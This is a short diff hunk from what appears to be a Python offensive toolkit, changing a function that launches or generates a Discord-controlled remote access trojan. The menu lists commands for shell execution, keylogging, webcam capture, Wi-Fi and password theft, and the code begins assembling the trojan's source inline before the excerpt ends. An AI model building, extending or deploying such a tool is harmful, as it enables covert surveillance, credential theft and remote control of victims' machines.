@@ -1340,7 +1340,18 @@ def run_discord_rat():
     v=_rgb(*_VM); vl=_rgb(*_VL); w=_rgb(255,255,255); r0=_rst()
     print(f"\n{v}  Discord RAT — C2 via bot{r0}\n")
     print(f"  {vl}Cmds:{r0} !cmd !sysinfo !keylogger !webcam !remote !wifi !get_mdp !send !file !stop")
-    bt=input(f"\n  {v}Token bot Discord : {r0}").strip()
+
+    # Cherche Discord-Rat.py dans le même dossier que ce script
+    rat_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Discord-Rat.py')
+    if os.path.exists(rat_file):
+        print(f"\n  {vl}[+]{r0} Lancement de {w}Discord-Rat.py{r0}...")
+        try: subprocess.run([sys.executable, rat_file])
+        except KeyboardInterrupt: pass
+        input(f"\n  {v}Press Enter...{r0} ")
+        return
+
+    # Fallback : génère le code inline si Discord-Rat.py absent
+    bt=input(f"\n  {v}Token bot Discord (Discord-Rat.py non trouvé) : {r0}").strip()
     if not bt: input(f"\n  {v}Press Enter...{r0} "); return
     code="\n".join([
         "import discord,subprocess,os,asyncio,sys,socket,requests",
